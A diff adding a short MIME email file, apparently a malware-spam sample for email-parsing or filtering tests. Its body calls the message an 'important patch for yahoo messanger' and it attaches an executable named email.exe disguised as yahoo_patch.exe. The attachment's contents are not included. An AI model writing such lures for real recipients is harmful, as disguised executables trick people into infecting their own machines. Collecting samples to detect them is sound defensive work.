@@ -1,0 +1,28 @@
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_000A_01C4FC66.D7DF5CE0"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Unsent: 1
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.2180
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_000A_01C4FC66.D7DF5CE0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_001_000B_01C4FC66.D7DF5CE0"
+
+
+------=_NextPart_001_000B_01C4FC66.D7DF5CE0
+Content-Type: text/plain;
+	charset="windows-1256"
+Content-Transfer-Encoding: quoted-printable
+
+hi,,this is an important patch for yahoo messanger!
+
+------=_NextPart_000_000A_01C4FC66.D7DF5CE0
+Content-Type: application/x-msdownload;
+	name="email.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+	filename="yahoo_patch.exe"
